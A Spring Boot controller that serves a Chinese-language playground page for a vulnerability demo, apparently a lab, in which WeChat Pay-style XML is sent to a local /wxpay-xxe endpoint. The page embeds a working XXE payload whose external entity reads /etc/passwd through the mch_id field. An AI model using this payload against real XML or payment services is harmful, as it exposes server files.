package myapp;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class PlaygroundController {

    @GetMapping(value = {"/", "/playground"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        String attack = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY >< !ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><xml><appid>wxpay</appid><mch_id>&xxe;</mch_id></xml>".replace("< !", "<!");
        String normal = "<xml><appid>wxpay</appid><mch_id>123456</mch_id></xml>";
        return "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"UTF-8\"><title>wxpay-xxe Playground</title>" + style() +
                "</head><body><div class=\"container\"><h1>wxpay-xxe Playground</h1><p class=\"hint\">可先填充攻击/正常 XML，再手动修改并发送到 <code>/wxpay-xxe</code>。</p>" +
                "<label for=\"payload\">Payload</label><textarea id=\"payload\"></textarea><div class=\"actions\"><button class=\"attack\" onclick=\"fillAttack()\">填充攻击 Payload</button><button class=\"normal\" onclick=\"fillNormal()\">填充正常 Payload</button><button class=\"send\" onclick=\"sendCurrent()\">发送当前 Payload</button></div><label for=\"result\">响应</label><pre id=\"result\">等待发送请求...</pre></div>" +
                "<script>const attackPayload='" + esc(attack) + "';const normalPayload='" + esc(normal) + "';const payloadBox=document.getElementById('payload');const resultBox=document.getElementById('result');function fillAttack(){payloadBox.value=attackPayload;}function fillNormal(){payloadBox.value=normalPayload;}async function sendCurrent(){resultBox.textContent='请求发送中...';try{const response=await fetch('/wxpay-xxe',{method:'POST',headers:{'Content-Type':'application/xml'},body:payloadBox.value});const text=await response.text();resultBox.textContent='HTTP '+response.status+'\\n'+text;}catch(error){resultBox.textContent='请求失败: '+error;}}fillNormal();</script></body></html>";
    }

    private String style() {
        return "<style>body{font-family:Arial,sans-serif;margin:40px;background:#f5f7fb;color:#1f2937}.container{max-width:920px;margin:0 auto;background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.08)}textarea,pre{width:100%;box-sizing:border-box}textarea{min-height:220px;padding:12px;border-radius:8px;border:1px solid #d0d7de;margin-bottom:16px;resize:vertical}pre{min-height:180px;padding:12px;border-radius:8px;background:#111827;color:#e5e7eb;overflow:auto}.actions{display:flex;gap:12px;margin:20px 0}button{padding:12px 18px;border:0;border-radius:8px;cursor:pointer;font-size:14px;color:#fff}.attack{background:#c0392b}.normal{background:#1f6feb}.send{background:#111827}.hint{color:#6b7280;font-size:14px}code{background:#eef2ff;padding:2px 6px;border-radius:4px}</style>";
    }

    private String esc(String value) {
        return value.replace("\\", "\\\\").replace("'", "\\'").replace("\r", "").replace("\n", "\\n");
    }
}
